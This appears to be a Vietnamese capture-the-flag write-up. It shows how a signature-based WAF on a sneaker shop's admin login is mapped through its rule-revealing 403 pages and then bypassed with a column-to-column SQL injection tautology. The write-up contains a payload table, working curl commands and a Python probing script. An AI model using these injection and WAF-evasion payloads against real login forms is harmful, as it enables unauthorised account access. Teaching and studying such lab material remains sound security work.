---
title: "Solevault"
category: "Web"
tags: ["sqli", "waf-bypass", "auth-bypass"]
solve_date: "2026-10-10T21:34:00+07:00"
language: "vi"
points: 888
---

# Solevault

**Flag:** `kBxAc{si9n4ture_waf_b|0ck5_0n|y_7he_f4m0us_pay1oad5_sw@p_the_numb3r5_and_@ny_t4u+0l0gy_wi1l_0p3n_7he_$o1evau|+_4dm!n_con5ol3}`
**Service:** `http://sole.136.82.117.70.nip.io/` (nip.io wildcard, phân giải về `136.82.117.70`)
**Format flag:** `kBxAc{}`

## Đề bài

SoleVault là nhãn sneaker nội địa vừa ra dòng SS'26. Bài yêu cầu truy cập internal console phía sau form đăng nhập có WAF lọc theo signature.

## Phân tích

Trang chủ là HTML render phía server, chỉ có hai asset tĩnh (`/static/base.css`, `/static/app.js`) và một form tìm kiếm `GET /` với tham số `q`. `app.js` thuần localStorage (giỏ hàng, wishlist), không gọi API nào, nên toàn bộ bề mặt động nằm ở backend.

`/robots.txt` liệt kê `/admin` cùng hai đường dẫn legacy `/legacy-admin` và `/console`. `/admin` tồn tại (200), `/console` trả 404; `/legacy-admin` và các đường dẫn `/cart`, `/checkout`, `/account` trong cùng file chưa được kiểm chứng. `/admin` là form đăng nhập `POST /admin` với hai trường `username`, `password`, footer ghi "Protected by SoleVault Shield — malicious requests are blocked and reported to security@solevault.in".

Hành vi của ứng dụng và của lớp Shield được phân biệt qua hai loại phản hồi:

- Thông tin đăng nhập sai trả `200` kèm `<div class="err">Invalid username or password.</div>`; không có lỗi DB nào lộ ra.
- Request bị chặn trả `403` với trang `403 — Request blocked`, trong đó có hai dòng máy đọc được:

```html
<div class="rule-chip">Rule <b>SQLI-1006</b> · Quoted string comparison</div>
<div class="req-meta">REQ-08DA-BA68 · /admin</div>
```

Rule ID được in ra mỗi lần chặn, nên 403 hoạt động như một oracle phân loại: thay một payload đổi sang payload khác và đọc `rule-chip` cho biết chính xác mẫu nào vừa khớp. Bảng dưới là kết quả khảo sát từng payload riêng lẻ gửi qua trường `username` của `POST /admin`, một request một payload, lấy nguyên văn nhãn rule.

| Payload gửi qua `username=` | Kết quả |
|---|---|
| `admin` | 200, `Invalid username or password.` |
| `admin'` | 200, `Invalid username or password.` |
| `admin\` | 200, `Invalid username or password.` |
| `admin--` | 200, `Invalid username or password.` |
| `admin'-- -` | 403 `SQLI-1007` · Quote-adjacent comment |
| `admin'#` | 403 `SQLI-1007` · Quote-adjacent comment |
| `admin' or 1=1-- -` | 403 `SQLI-1001` · Known tautology signature |
| `admin OR 1=1` | 403 `SQLI-1001` · Known tautology signature |
| `admin' or 1=1#` | 403 `SQLI-1001` · Known tautology signature |
| `admin' or not 0-- -` | 403 `SQLI-1005` · Boolean shortcut (OR/AND with literal) |
| `admin' OR username IS NOT NULL-- -` | 403 `SQLI-1005` · Boolean shortcut |
| `admin' or 'a'='a` | 403 `SQLI-1006` · Quoted string comparison |
| `admin' or 'a'<'b'-- -` | 403 `SQLI-1006` · Quoted string comparison |
| `admin SELECT` | 403 `SQLI-1002` · SQL keyword detected |
| `admin UNION` | 403 `SQLI-1002` · SQL keyword detected |
| `admin;` | 403 `SQLI-1003` · Stacked statement |
| `admin sleep(2)` | 403 `SQLI-1004` · Timing-based probe |
| `admin/*x*/` | 403 `SQLI-1009` · Inline comment / operator abuse |
| `admin\|\|1` | 403 `SQLI-1009` · Inline comment / operator abuse |
| `admin' OR username LIKE 'a%` | 403 `SQLI-1008` · Extraction / obfuscation utility |
| `admin' or 2>1-- -` | 403 `XSS-2001` · HTML delimiter |
| `admin'\tor\t2>1--\t-` | 403 `XSS-2001` · HTML delimiter |

Hai ràng buộc nổi lên từ bảng:

1. Trong các probe, `XSS-2001` chặn payload có `<` hoặc `>`, bao gồm các so sánh số `2>1` và `1<2`.
2. `SQLI-1001` và `SQLI-1005` chặn tautology có **vế phải là literal** (`1=1`, `not 0`, `IS NOT NULL`), `SQLI-1006` chặn so sánh **chuỗi có nháy** (`'1'='1`, `'a'='a`), `SQLI-1007` chặn comment đứng ngay sau dấu nháy (`'--`, `'#`).

Còn một họ tautology không rơi vào mẫu nào: so sánh **cột với cột** (`username=username`), với comment đặt cách dấu nháy một chuỗi token thay vì sát ngay sau nó. Tham số `q` trên trang chủ không liên quan tới đường đi này; nó được escape khi phản chiếu (`'` thành `&#39;`) và `<script>`/`<img onerror>` bị `XSS-2001` chặn từ cổng.

## Lời giải

1. Dùng 403 làm oracle để lập bảng rule như trên, rồi chọn payload không khớp mẫu nào: `admin' or username=username-- -`.
2. Gửi payload đó qua trường `username`, `password` tùy ý:

```bash
curl -sS -c jar.txt -X POST 'http://sole.136.82.117.70.nip.io/admin' \
  --data-urlencode "username=admin' or username=username-- -" \
  --data-urlencode 'password=x'
```

Phản hồi phù hợp với SQL injection tại trường `username`. Một query minh họa cho hành vi này là

```sql
SELECT ... FROM users WHERE username='admin' or username=username-- ' AND password='...'
```

phần `-- ` về sau bị comment hóa, và `username=username` đúng với các hàng có username khác NULL. Điều kiện do đó luôn thỏa mãn, hàng đầu tiên được trả về và được coi là người đăng nhập. Vì chuỗi `-- -` không đứng sát dấu nháy đơn, và vế phải của phép so sánh là một cột chứ không phải literal hay chuỗi có nháy, request không khớp `SQLI-1001`, `1005`, `1006`, `1007`.

3. Phản hồi là `302` tới `/admin/panel`, kèm cookie session `sv_admin`. Đây là token dạng itsdangerous/Flask (`payload.signature`), phân đoạn đầu giải mã base64 ra:

```json
{"u": "admin", "n": "Store Administrator", "r": "owner"}
```

4. `GET /admin/panel` với cookie vừa nhận trả dashboard 7.7 KB. Cuối trang có một khối `flag-card` nhãn "🔒 Regulatory · Compliance asset #7 · Do not share", ghi chú "This asset is referenced in the FY-26 audit binder. Only owner-role staff can view this page." và chứa flag.

## Kết quả

```text
kBxAc{si9n4ture_waf_b|0ck5_0n|y_7he_f4m0us_pay1oad5_sw@p_the_numb3r5_and_@ny_t4u+0l0gy_wi1l_0p3n_7he_$o1evau|+_4dm!n_con5ol3}
```

Chuỗi đọc trực tiếp từ HTML của `/admin/panel` trong phiên có role `owner`, 125 ký tự ASCII, đúng format `kBxAc{}`. Nội dung flag cũng mô tả lại đúng cơ chế vừa dùng: chữ ký của WAF khớp một số mẫu literal, trong khi payload so sánh cột với chính nó qua được các rule đã khảo sát. Chưa lưu phản hồi submission.

## Tái hiện

Cần `curl` (hoặc `python` + `requests`). Hai lệnh sau tái hiện toàn bộ đường đi, chạy được ngay mà không cần file hỗ trợ:

```bash
B=http://sole.136.82.117.70.nip.io
curl -sS -c jar.txt -X POST "$B/admin" \
  --data-urlencode "username=admin' or username=username-- -" \
  --data-urlencode 'password=x'
curl -sSL -b jar.txt "$B/admin/panel" | grep -oE 'kBxAc\{[^<]*\}'
```

```text
HTTP/1.1 302 Found
location: /admin/panel
set-cookie: sv_admin=<base64(payload)>.<hmac-signature>; HttpOnly; Path=/; SameSite=Lax
```

Để dựng lại bảng rule, lưu fenced block dưới đây thành `waf_probe.py` (`pip install requests`) rồi chạy `python waf_probe.py`. Script gửi các payload liệt kê trong mã và đọc `rule-chip`/`req-meta`/`err` từ phản hồi.

```python
import re, time, requests

B = "http://sole.136.82.117.70.nip.io"
RULE = re.compile(r"Rule <b>(.*?)</b> · (.*?)</div>")
ERR = re.compile(r'<div class="err">(.*?)</div>')

CASES = [
    "admin", "admin'", "admin'--", "admin--",
    "admin'-- -", "admin'#", "admin' or 1=1-- -", "admin OR 1=1",
    "admin' or 1=1#", "admin' or not 0-- -", "admin' or 'a'='a",
    "admin' or 'a'<'b'-- -", "admin SELECT", "admin UNION", "admin;",
    "admin sleep(2)", "admin/*x*/", "admin||1",
    "admin' OR username LIKE 'a%", "admin' or 2>1-- -",
    "admin' or username=username-- -",
]

s = requests.Session()
s.headers["User-Agent"] = "waf-probe"

for pl in CASES:
    r = s.post(B + "/admin", data={"username": pl, "password": "x"}, timeout=25)
    m = RULE.search(r.text)
    e = ERR.search(r.text)
    verdict = m.group(1) + " / " + m.group(2) if m else "passed"
    print("%-36s %s  %s" % (pl, r.status_code, verdict))
    if e:
        print("    app says: " + e.group(1))
    time.sleep(0.35)
```

Giới hạn của bộ dữ liệu trên: rule chỉ được khảo sát qua trường `username` của `POST /admin`, nên có thể còn chữ ký khác không xuất hiện trong tập payload đã thử. Role `owner` lấy từ chính điều kiện WHERE bị bẻ, không phải từ một credential thật; không có bằng chứng nào về việc bảng `users` được truy vấn như thế nào ngoài suy ra từ phản hồi.
